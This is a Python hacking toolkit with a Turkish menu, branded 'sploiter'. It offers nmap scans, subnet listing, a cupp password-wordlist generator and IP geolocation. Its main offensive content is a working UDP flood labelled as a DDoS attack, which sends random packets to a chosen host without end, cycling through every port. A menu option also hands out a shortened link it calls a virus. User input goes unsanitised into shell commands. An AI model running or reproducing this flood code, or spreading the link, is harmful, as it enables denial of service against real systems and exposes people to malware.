import os

import time

import socket

import sys

import ipaddress

import requests

import platform

from colorama import Fore, Style

import scapy.all as scapy

import random

os.system("pip3 install ipaddress")

os.system("pip3 install requests")

os.system("pip3 install colorama")

os.system("pip3 install scapy")

print(Fore.RED + "")

os.system("figlet sploiter")
      


system_info = {}

system_info['İşletim Sistemi'] = platform.system()

system_info['Sürüm'] = platform.release()

system_info['Mimarisi'] = platform.machine()

for category, info in system_info.items():

    print(category)

    print('=' * 30)

    print(info)

    print() 




print(Style.RESET_ALL)

print(Fore.YELLOW +  """

      [ CODED BY ENESXSEC ]

        insta: enesxsec""")

os.system("neofetch --ascii_distro blackarch")

def yukleme_animasyonu():

    animasyon_karakterleri = ["|", "/", "-", "\\"]

    for i in range(10):

        animasyon = f"Yükleniyor... {animasyon_karakterleri[i % len(animasyon_karakterleri)]}"

        sys.stdout.write(animasyon)

        sys.stdout.flush()

        time.sleep(0.1)

        sys.stdout.write("\b" * len(animasyon))

        sys.stdout.flush()

yukleme_animasyonu()

print("Tamamlandı!")

def get_local_ip():

    try:

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        sock.connect(("8.8.8.8", 80))

        local_ip = sock.getsockname()[0]

        sock.close()

        return local_ip

    except socket.error:

        return "IP adresi alınamadı."

ip_address = get_local_ip()

print("Yerel IP Adresiniz:", ip_address)

hostname = socket.gethostname()

print("Hostname:", hostname)

response = requests.get("http://ip-api.com/json")

data = response.json()

gateway = data["query"]

print("Ağ Geçidi:", gateway)

time.sleep(2)

print(Fore.RED + """--------------------------------------""")

print("> welcome to the menu")

time.sleep(1)

print(Fore.BLUE + """

[1] NMAP SCANNER

[2] NMAP VERSİYON BİLGİSİ

[3] NMAP PORT ÜZERİNDE BULUNAN İP GÖSTERGESİ

[4] E-VİRÜS

[5] SUBNET SCANNER

[6] DDOS SALDIRISI YAP

""")

print(Style.RESET_ALL)

print(Fore.RED + "--------------------------------------")

islemno=input("İşlem numarası giriniz: ")

if islemno=="1":

        hedefip=input("hedef HOST giriniz : ")

        os.system("nmap -sT -v "+hedefip)

if islemno=="2":

        hedefip=input("hedef HOST giriniz : ")

        os.system("nmap -sV  "+hedefip)

if islemno=="3":
      
       hedefip=input("hedef HOST giriniz : ")
      
       os.system("nmap -sn -n -v --open "+hedefip)

if islemno=="4":

        hedefip=input("VİRÜSLÜ LİNKİ ALMAK İÇİN ENTER BAS: ")

        time.sleep(2)

        print(Fore.YELLOW + "> https://tinyurl.com/uppdatesnew <")

if islemno=="5":

    ip_adresi = input("IP adresini girin (örneğin, 192.168.0.0): ")

    prefix = int(input("Prefix uzunluğunu girin (örneğin, 24): "))

    network = ipaddress.ip_network(ip_adresi + '/' + str(prefix), strict=False)

    subnetler = list(network.subnets(new_prefix=prefix))

    print(f"\nAna ağ: {network.network_address}/{network.prefixlen}")

    print(f"Alt ağ sayısı: {len(subnetler)}\n")

    for subnet in subnetler:

        print(subnet)

if islemno == "6":

    mydate = time.strftime('%Y-%m-%d')

    mytime = time.strftime('%H-%M')

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    bytes = random._urandom(1490)

    print(Fore.BLUE + "")

    os.system("figlet DDOS")

    time.sleep(1)

    print(Fore.YELLOW + "------------------------------- ")

    ip = input("HEDEF HOST GİR : ")

    time.sleep(1)

    port = int(input("HEDEF PORT GİR : "))

    print("SALDIRI BAŞLATILIYOR...")

    print("HEDEF HOST", ip, "HEDEF PORT", port, "...")

    time.sleep(5)

    sent = 0

    while True:

        sock.sendto(bytes, (ip, port))

        sent = sent + 1

        port = port + 1

        print("Sent %s packet to %s through port:%s" % (sent, ip, port))

        if port == 65535:

            port = 1

    input("çıkmak için enter tuşuna bas...")
            
   
islemno = input("LÜTFEN 1 SAYISINA TIKLAYINIZ:  ")

print("--------------------------------------")

islemno=input("wordlist aracına gitmek için enter bas yada çıkmak için CTRL+C yap: ")

os.system("figlet wordlist")

def cupp():

    print(Fore.YELLOW + """

[1] WORDLİST OLUŞTURMA ARACINI YÜKLE

[2] WORDLİST OLUŞTURMA

[0] IP TARA

⟩ SİTE İP TARAMAK İSTİYORSANIZ 0 SAYISINA BASIN

""")

    islemno=input("secim: ")

    if islemno=="1":

        os.system("clear")

        os.system("git clone https://github.com/Mebus/cupp.git")

        print("Arac yüklenmiştir")

        time.sleep(2)

        os.system("clear")

        cupp()

    elif islemno=="2":

        os.system("clear")

        os.system("python3 ./cupp/cupp.py -i")

        os.system("clear")

        cupp()

    elif islemno=="0":

        os.system("")

        anapg()

    else:

        print("yanlış tuşlama")

        time.sleep(2)

        cupp()

def anapg():

    pass

cupp()

print(">>>>>Biraz bekleyin site ip tarama aracına yönlendiriliyorsunuz<<<<<")

time.sleep(3)

os.system("figlet ip")

ip = input('site adı gir: ')

a = f'http://ip-api.com/json/{ip}'

a2 = requests.get(a)

a3 = a2.json()

status = a3["status"]

cidade = a3["city"]

q = a3["query"]

país = a3["country"]

cdp = a3["countryCode"]

sestate = a3["region"]

state = a3["regionName"]

zip = a3["zip"]

lat = a3["lat"]

long = a3["lon"]

timez = a3["timezone"]

op = a3["isp"]

org = a3["org"]

As = a3["as"]

print(f'ip = {q}')

print(f'status = {status}')

print(f'país  = {país}')

print(f'sigla = {cdp}')

print(f'estado = {state}-{sestate}')

print(f'cidade = {cidade}')

print(f'zip = {zip}')

print(f'latitude = {lat}')

print(f'longitude = {long}')

print(f'continente/cidade = {timez}')

print(f'isp = {op}')

print(f'org = {org}')

print(f'As = {As}')
